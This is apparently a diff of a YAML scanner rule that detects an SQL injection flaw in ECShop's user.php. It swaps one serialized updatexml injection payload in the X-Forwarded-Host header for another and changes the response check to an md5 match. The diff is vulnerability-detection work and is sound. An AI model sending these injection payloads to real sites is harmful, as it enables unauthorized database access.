@@ -4,10 +4,10 @@ rules:
     path: /user.php?act=collection_list
     headers:
       X-Forwarded-Host: >-
-        45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf95
+        45ea207d7a2b68c49582d2d22adf953apay_log|s:39:"1' and updatexml(1,md5(444444),1) and '";|
     follow_redirects: false
     expression: |
-      response.status == 200 && response.body.bcontains(b'Array') && response.body.bcontains(b'error')
+      response.status == 200 && response.body.bcontains(b"ab1fa529d7273da0db6b49cc4f3")
 detail:
   author: 曦s
   links: 
